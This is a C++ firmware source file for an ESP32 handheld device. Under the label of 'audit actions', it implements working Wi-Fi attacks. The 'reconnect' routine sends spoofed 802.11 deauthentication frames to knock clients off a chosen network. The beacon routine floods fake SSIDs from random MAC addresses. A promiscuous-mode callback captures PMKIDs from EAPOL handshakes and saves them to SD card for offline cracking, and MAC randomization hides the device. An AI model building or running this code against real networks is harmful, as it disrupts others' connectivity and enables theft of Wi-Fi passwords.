#include "audit_actions.h"
#include "constants.h"
#include "wifi_scanner.h" // For set_promiscuous_channel
#include "types.h" // Ensure types.h is included for AppContext definition
#include "sd_logger.h"
#include "wifi_frames.h"
#include "pcap_and_probes.h"
#include <esp_wifi.h>
#include <nvs_flash.h>

// LVGL object forward declarations
extern lv_obj_t *btn_reconnect, *btn_beacon, *btn_pmkid, *btn_stop_audit;
extern lv_obj_t *lbl_audit_status;

static AppContext* audit_context = nullptr;

// Safe wrapper: esp_wifi_80211_tx requires WIFI_IF_STA (interface 0) to be started.
// If the interface isn't ready it returns ESP_ERR_INVALID_ARG and logs "invalid interface 0".
// We verify the interface is up before every raw tx.
static inline bool wifi_tx(const uint8_t* frame, int len) {
    wifi_mode_t mode;
    if (esp_wifi_get_mode(&mode) != ESP_OK) return false;
    if (mode != WIFI_MODE_STA && mode != WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_start();
        delay(20);
    }
    return esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK;
}

// WiFi management frame templates (for audit actions)
static const uint8_t reconnect_frame[] = {
  0xC0,0x00, 0x3A,0x01, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00, 0x07,0x00
};
static uint8_t reconnect_buf[sizeof(reconnect_frame)];

static const uint8_t beacon_header[] = {
  0x80,0x00, 0x00,0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x64,0x00, 0x11,0x04
};
static uint8_t beacon_frame[128];


void audit_actions_init(AppContext* context) {
    audit_context = context;
}

void randomize_wifi_mac() {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02; // Set locally administered bit, clear multicast bit
    esp_wifi_set_mac(WIFI_IF_STA, mac);
}

static void show_audit_buttons(bool show) {
    auto f = show ? lv_obj_clear_flag : lv_obj_add_flag;
    f(btn_reconnect, LV_OBJ_FLAG_HIDDEN);
    f(btn_beacon, LV_OBJ_FLAG_HIDDEN);
    f(btn_pmkid, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(btn_stop_audit, LV_OBJ_FLAG_HIDDEN); // Always hide stop button when returning to idle
}

void stop_audit_action(AppContext* context) {
    if (context->audit.audit_timer) {
        lv_timer_del(context->audit.audit_timer);
        context->audit.audit_timer = nullptr;
    }
    if (context->audit.current_mode == AUDIT_PMKID) {
        // Restore main callback used for STA discovery + PCAP/probe monitoring.
        esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
    }
    context->audit.current_mode = AUDIT_NONE;
    context->wifi_scan.paused = false;
    esp_wifi_set_promiscuous(false);
    lv_label_set_text(lbl_audit_status, "#444444 IDLE#");
    show_audit_buttons(context->wifi_scan.selected_net >= 0 || context->wifi_scan.reconnect_sta_target >= 0);
}

void reconnect_tick(lv_timer_t *timer) {
    AppContext* context = (AppContext*)timer->user_data;
    if (!context) return;
    int selectedNet = context->wifi_scan.selected_net;
    int reconnect_sta_target = context->wifi_scan.reconnect_sta_target;

    if (selectedNet < 0 && reconnect_sta_target < 0) {
        stop_audit_action(context);
        return;
    }

    uint8_t target_bssid[6] = {0};
    uint8_t target_sta[6] = {0};
    uint8_t target_channel = 1;
    bool valid_ap = false;
    bool valid_sta = false;

    if (context->wifi_scan.mutex && xSemaphoreTake(context->wifi_scan.mutex, pdMS_TO_TICKS(50)) == pdTRUE) {
        if (selectedNet >= 0 && selectedNet < context->wifi_scan.ap_count) {
            memcpy(target_bssid, context->wifi_scan.ap_list[selectedNet].bssid, 6);
            target_channel = context->wifi_scan.ap_list[selectedNet].channel;
            valid_ap = true;
        }
        if (reconnect_sta_target >= 0 && reconnect_sta_target < context->wifi_scan.sta_count && context->wifi_scan.sta_list[reconnect_sta_target].active) {
            memcpy(target_sta, context->wifi_scan.sta_list[reconnect_sta_target].mac, 6);
            valid_sta = true;
        }
        xSemaphoreGive(context->wifi_scan.mutex);
    }

    if (valid_ap) {
        esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    }

    memcpy(reconnect_buf, reconnect_frame, sizeof(reconnect_frame));
    uint8_t* bssid = valid_ap ? target_bssid : nullptr;

    if (valid_sta && bssid) {
        uint8_t *sta = target_sta;
        // AP -> STA
        memcpy(reconnect_buf + 4, sta, 6);
        memcpy(reconnect_buf + 10, bssid, 6);
        memcpy(reconnect_buf + 16, bssid, 6);
        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
        // STA -> AP
        memcpy(reconnect_buf + 4, bssid, 6);
        memcpy(reconnect_buf + 10, sta, 6);
        memcpy(reconnect_buf + 16, bssid, 6);
        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
    } else if (bssid) {
        // Broadcast reconnect prompt
        uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(reconnect_buf + 4, bc, 6);
        memcpy(reconnect_buf + 10, bssid, 6);
        memcpy(reconnect_buf + 16, bssid, 6);
        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
        memcpy(reconnect_buf + 4, bssid, 6);
        memcpy(reconnect_buf + 10, bc, 6);
        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
    }
}

void beacon_tick(lv_timer_t *timer) {
    AppContext* context = (AppContext*)timer->user_data;
    if (!context) return;
    
    if (context->audit.custom_beacon_ssids.empty()) return; // No SSIDs configured

    const char *ssid = context->audit.custom_beacon_ssids[context->audit.beacon_idx++ % context->audit.custom_beacon_ssids.size()].c_str();
    
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
    
    uint8_t slen = strlen(ssid);
    uint8_t flen = sizeof(beacon_header) + 2 + slen + 3;
    memset(beacon_frame, 0, sizeof(beacon_frame));
    memcpy(beacon_frame, beacon_header, sizeof(beacon_header));
    memcpy(&beacon_frame[10], mac, 6);
    memcpy(&beacon_frame[16], mac, 6);
    
    uint8_t *ie = beacon_frame + sizeof(beacon_header);
    ie[0] = 0x00; ie[1] = slen; memcpy(&ie[2], ssid, slen); ie += 2 + slen;
    ie[0] = 0x03; ie[1] = 0x01; ie[2] = 0x01;
    
    wifi_tx(beacon_frame, flen);
}

void pmkid_tick(lv_timer_t *timer) {
    AppContext* context = (AppContext*)timer->user_data;
    if (!context) return;

    if (context->audit.pmkid_found) {
        if (sd_card_ready()) {
            sd_log_pmkid(context->audit.pmkid_value, context->audit.pmkid_target_bssid, context->audit.pmkid_sta_mac, context->audit.pmkid_target_ssid);
            lv_label_set_text(lbl_audit_status, "#00FF88 PMKID CAPTURED!#\nSaved to SD");
        } else {
            lv_label_set_text(lbl_audit_status, "#FF4444 PMKID CAPTURED!#\nNo SD card");
        }
        stop_audit_action(context);
    }
}

static inline __attribute__((always_inline)) uint16_t read_be16(const uint8_t* p) {
    return ((uint16_t)p[0] << 8) | p[1];
}

static inline __attribute__((always_inline)) uint16_t read_le16(const uint8_t* p) {
    return ((uint16_t)p[1] << 8) | p[0];
}

static inline __attribute__((always_inline)) bool extract_pmkid_from_rsn_ie(const uint8_t* ie, size_t ie_total_len, uint8_t out_pmkid[16]) {
    if (!ie || ie_total_len < 2) return false;
    if (ie[0] != 0x30) return false; // RSN IE

    const uint8_t ie_len = ie[1];
    if ((size_t)ie_len + 2 > ie_total_len) return false;

    const uint8_t* p = ie + 2;
    size_t remaining = ie_len;

    // Version (2) + Group Cipher (4) + Pairwise Count (2) + AKM Count (2) + RSN Caps (2) + PMKID Count (2)
    if (remaining < 2 + 4 + 2) return false;

    p += 2; remaining -= 2; // version
    p += 4; remaining -= 4; // group cipher suite

    if (remaining < 2) return false;
    uint16_t pairwise_count = read_le16(p);
    p += 2; remaining -= 2;
    if (pairwise_count > remaining / 4) return false;
    size_t pairwise_bytes = (size_t)pairwise_count * 4;
    p += pairwise_bytes; remaining -= pairwise_bytes;

    if (remaining < 2) return false;
    uint16_t akm_count = read_le16(p);
    p += 2; remaining -= 2;
    if (akm_count > remaining / 4) return false;
    size_t akm_bytes = (size_t)akm_count * 4;
    p += akm_bytes; remaining -= akm_bytes;

    if (remaining < 2) return false;
    p += 2; remaining -= 2; // RSN capabilities

    if (remaining < 2) return false;
    uint16_t pmkid_count = read_le16(p);
    p += 2; remaining -= 2;

    if (pmkid_count < 1) return false;
    if (pmkid_count > remaining / 16) return false;

    memcpy(out_pmkid, p, 16);
    return true;
}

void IRAM_ATTR pmkid_monitor_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!buf || !audit_context) return;

    AppContext* context = audit_context;
    if (context->audit.current_mode != AUDIT_PMKID) return;
    if (context->audit.pmkid_found) return;
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    const uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 8 + 4 + 95) return;

    const uint16_t fc = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
    const uint8_t frame_type = (fc >> 2) & 0x3;
    if (frame_type != 2) return; // data

    const bool to_ds = (fc & 0x0100) != 0;
    const bool from_ds = (fc & 0x0200) != 0;
    if (to_ds || !from_ds) return; // Only AP->STA frames (FromDS=1, ToDS=0)

    // Addr2 is BSSID for FromDS frames
    if (memcmp(frame + 10, context->audit.pmkid_target_bssid, 6) != 0) return;

    size_t hdr_len = 24;
    const uint8_t subtype = (fc >> 4) & 0xF;
    if ((subtype & 0x08) != 0) hdr_len += 2; // QoS control
    if ((fc & 0x8000) != 0) hdr_len += 4;    // HT control
    if (hdr_len + 8 + 4 > len) return;

    const size_t llc_off = hdr_len;
    if (frame[llc_off] != 0xAA || frame[llc_off + 1] != 0xAA || frame[llc_off + 2] != 0x03) return;
    if (frame[llc_off + 3] != 0x00 || frame[llc_off + 4] != 0x00 || frame[llc_off + 5] != 0x00) return;
    if (frame[llc_off + 6] != 0x88 || frame[llc_off + 7] != 0x8E) return; // 802.1X / EAPOL

    const size_t eapol_off = llc_off + 8;
    const uint8_t eapol_type = frame[eapol_off + 1];
    if (eapol_type != 3) return; // EAPOL-Key only

    const uint16_t eapol_len = read_be16(frame + eapol_off + 2);
    if (eapol_len < 95) return; // too short for RSN key frame
    if (eapol_off + 4 + eapol_len > len) return;

    const size_t key_off = eapol_off + 4;
    const uint16_t key_info = read_be16(frame + key_off + 1);

    const bool key_ack = (key_info & 0x0080) != 0;
    const bool install = (key_info & 0x0040) != 0;
    const bool key_mic = (key_info & 0x0100) != 0;
    const bool enc_kd = (key_info & 0x1000) != 0;
    if (!key_ack || install || key_mic || enc_kd) return; // expected M1

    const uint16_t kd_len = read_be16(frame + key_off + 93);
    const size_t kd_off = key_off + 95;
    if (kd_off + kd_len > eapol_off + 4 + eapol_len) return;

    const uint8_t* key_data = frame + kd_off;
    const size_t key_data_len = kd_len;

    uint8_t pmkid[16] = {0};
    bool got_pmkid = false;

    for (size_t i = 0; i + 2 <= key_data_len;) {
        const uint8_t id = key_data[i];
        const uint8_t l = key_data[i + 1];
        const size_t total = 2 + (size_t)l;
        if (i + total > key_data_len) break;

        if (id == 0x30) { // RSN IE
            got_pmkid = extract_pmkid_from_rsn_ie(key_data + i, total, pmkid);
            break;
        }
        i += total;
    }

    if (!got_pmkid) return;

    memcpy(context->audit.pmkid_value, pmkid, sizeof(context->audit.pmkid_value));
    memcpy(context->audit.pmkid_sta_mac, frame + 4, sizeof(context->audit.pmkid_sta_mac)); // Addr1 (DA) = STA MAC
    context->audit.pmkid_found = true;
}

// NVS functions for beacon SSIDs
void load_beacon_ssids_from_nvs(AppContext* context) {
    nvs_handle_t nvs_handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs_handle);
    if (err != ESP_OK) {
        Serial.printf("Error (%s) opening NVS handle!\n", esp_err_to_name(err));
        return;
    }

    context->audit.custom_beacon_ssids.clear();
    size_t required_size;
    char ssid_buf[MAX_BEACON_SSID_LENGTH + 1];

    for (int i = 0; i < MAX_BEACON_SSIDS; ++i) {
        char key[16];
        snprintf(key, sizeof(key), "%s_%d", NVS_BEACON_SSIDS_KEY, i);
        required_size = sizeof(ssid_buf);
        err = nvs_get_str(nvs_handle, key, ssid_buf, &required_size);
        if (err == ESP_OK) {
            context->audit.custom_beacon_ssids.push_back(String(ssid_buf));
        } else if (err == ESP_ERR_NVS_NOT_FOUND) {
            // No more SSIDs found
            break;
        } else {
            Serial.printf("Error (%s) reading SSID %d from NVS!\n", esp_err_to_name(err), i);
        }
    }
    nvs_close(nvs_handle);
}

void save_beacon_ssids_to_nvs(AppContext* context) {
    nvs_handle_t nvs_handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs_handle);
    if (err != ESP_OK) {
        Serial.printf("Error (%s) opening NVS handle!\n", esp_err_to_name(err));
        return;
    }
    // Erase all previous beacon SSID keys
    for (int i = 0; i < MAX_BEACON_SSIDS; ++i) {
        char key[16];
        snprintf(key, sizeof(key), "%s_%d", NVS_BEACON_SSIDS_KEY, i);
        nvs_erase_key(nvs_handle, key);
    }
    for (int i = 0; i < context->audit.custom_beacon_ssids.size(); ++i) {
        char key[16];
        snprintf(key, sizeof(key), "%s_%d", NVS_BEACON_SSIDS_KEY, i);
        nvs_set_str(nvs_handle, key, context->audit.custom_beacon_ssids[i].c_str());
    }
    nvs_commit(nvs_handle);
    nvs_close(nvs_handle);
}
